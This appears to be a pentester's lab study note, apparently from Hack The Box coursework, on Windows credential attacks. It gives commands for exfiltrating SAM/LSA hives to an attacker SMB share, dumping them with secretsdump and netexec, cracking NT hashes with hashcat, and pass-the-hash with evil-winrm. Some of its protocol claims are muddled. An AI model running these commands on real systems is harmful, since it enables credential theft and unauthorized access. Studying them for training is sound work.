

https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4


python3 /home/haxor/pen/venv/bin/smbserver.py -smb2support loot /home/haxor/pen/sharefolder

## LOCAL HASHES

Modern Windows uses the NT hash format you can use the -m 1000 mode in hashcat to crack these hashes

- **SAM** = "Here are the **password hashes** for all user accounts."
    
- **LSA Secrets** = "Here are **passwords and tokens** Windows saved for services, VPNs, cached logins, and other stuff."


[[Attacking SAM (Windows)]]

1. Copy SAM registry
2. Create fake smb share
3. Copy sam registry into there
4. Extract Secrets from with secretsdump.py 
5. Crack the NT hash with hashcat


SMBv1 runs on port 139 this is vuln to eternal blue.  

smbv2/3 port 445 

## CREATE SMB SHARE

/home/haxor/pen/sharefolder must exist

smbserver.py is in impacket

```
python3 /home/haxor/pen/venv/bin/smbserver.py -smb2support loot /home/haxor/pen/sharefolder
```

loot is the name of the smbshare now and can be accessed with
```
\\*IP\loot
```

then use move to move the files you want to that share

for example


```
move sam.save \\10.10.14.86\loot    
```


## Secrets dump

```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

inside of the share you have that you get the NT hash *if you cant find it read*

and crack it or maybe not

## netexec dumping lsa remotly
```
 nxc smb 10.129.237.93 --local-auth -u Bob -p HTB_@cademy_stdnt! --lsa
```

do --sam to dump sam instead
## RDP

✅ **RDP (Remote Desktop Protocol)** runs on **port 3389/TCP** by default.

xfreerdp /u:*username* /v:*ip*

itll prompt you for the pw


For LSASS please use

[[Attacking LSASS (Windows)]]




## Cracking NT hashes with hashcat 

Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the `Attacking SAM` section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.

Attacking LSASS

```shell-session
JackTheWizard@htb[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```


## Attacking Active Directory and Custom Usernames

[[Attacking Active Directory & NTDS.dit]]


## CAPTURING NTDS QUICK WAY
https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-ntds.dit

When using this it displays the LM hash format first followed by the NT hash 
username:RID:LM_HASH:NT_HASH::: 

## Pass-the-hash considerations

We can still use hashes to attempt to authenticate using a type of attack called pass the hash or (PtH) a PtH attack takes advantage of  the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm#:~:text=NTLM%20uses%20an%20encrypted%20challenge,to%20the%20secured%20NTLM%20credentials) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`. Here is an example of how this would work. However if the Domain is using Kererbos authentication which was designed to get rid of the PtH vulnerabilities in NTLM they may have NTLM disabled so this may not work in all domains. 
#### Pass-the-Hash with Evil-WinRM Example

Attacking Active Directory & NTDS.dit

```shell-session
JackTheWizard@htb[/htb]$ evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```


